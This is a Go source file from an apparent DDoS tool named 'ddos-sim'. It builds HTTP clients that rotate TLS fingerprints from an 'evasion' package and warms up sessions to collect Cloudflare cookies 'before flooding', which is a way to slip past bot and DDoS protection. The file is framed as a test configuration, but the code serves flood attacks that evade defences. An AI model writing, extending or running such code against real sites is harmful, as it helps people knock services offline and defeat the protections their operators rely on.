package attack

import (
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"time"

	"ddos-sim/internal/config"
	"ddos-sim/internal/evasion"
)

// BuildClient creates an http.Client with its own cookie jar and TLS fingerprint.
func BuildClient(cfg *config.TestConfig, workerID int) *http.Client {
	jar, _ := cookiejar.New(nil)

	baseTLS := evasion.TLSConfigs[workerID%len(evasion.TLSConfigs)]
	tlsCfg := baseTLS.Clone()
	tlsCfg.InsecureSkipVerify = cfg.InsecureSkipVerify

	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSClientConfig:       tlsCfg,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 15 * time.Second,
		MaxIdleConns:          5,
		MaxIdleConnsPerHost:   5,
		MaxConnsPerHost:       5,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true,
		WriteBufferSize:       4096,
		ReadBufferSize:        4096,
	}

	return &http.Client{
		Timeout:   cfg.Timeout,
		Transport: transport,
		Jar:       jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

// WarmupSession does a slow initial request to collect Cloudflare cookies before flooding.
func WarmupSession(client *http.Client, cfg *config.TestConfig) {
	req, err := evasion.BuildRequest("GET", cfg.URL, nil, true)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	time.Sleep(time.Duration(200+rand.Intn(500)) * time.Millisecond)
}
